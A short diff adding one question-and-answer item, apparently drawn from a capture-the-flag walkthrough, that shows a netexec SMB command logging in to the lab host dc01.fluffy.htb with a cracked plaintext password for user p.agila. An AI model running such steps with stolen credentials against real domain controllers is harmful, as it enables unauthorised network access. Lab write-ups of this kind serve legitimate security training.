@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+What do you do after successfully cracking the password?
+
+CONTEXT:
+You now have the plaintext password for p.agila.
+
+METHOD / ANSWER:
+Command: `netexec smb dc01.fluffy.htb -u p.agila -p 'prometheusx-303'`
+Explanation: Authenticate using the cracked password to gain access to the domain controller.
